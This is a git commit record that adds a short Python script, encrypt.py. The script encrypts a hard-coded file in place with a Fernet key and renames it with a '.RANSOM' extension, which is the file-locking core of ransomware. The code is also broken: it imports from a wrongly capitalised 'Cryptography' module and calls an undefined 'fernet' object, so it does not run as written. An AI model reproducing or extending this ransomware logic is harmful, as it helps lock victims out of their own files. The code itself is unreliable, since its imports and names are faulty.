2f9c8865f6c3c2c1e7efcee6a7a2ea2ab4e22d04
Lona <lonamafaufau@gmail.com>
2021-05-17 14:37:02 +1200

    Create encrypt.py

---
+++ encrypt.py
@@ -0,0 +1,19 @@
+  
+from Cryptography.fernet import Fernet
+import os
+
+# Assumes 'filekey.key' is created using the Fernet library
+with open('filekey.key', 'rb') as filekey:
+    key = filekey.read()
+
+my_file = 'testing.txt'    
+with open(my_file, 'rb') as file:
+    original = file.read()
+    
+encrypted = fernet.encrypt(original)
+
+with open(my_file, 'wb') as encrypted_file:
+    encrypted_file.write(encrypted)
+    
+base = os.path.splitext(my_file)[0]
+os.rename(my_file, base + '.RANSOM')
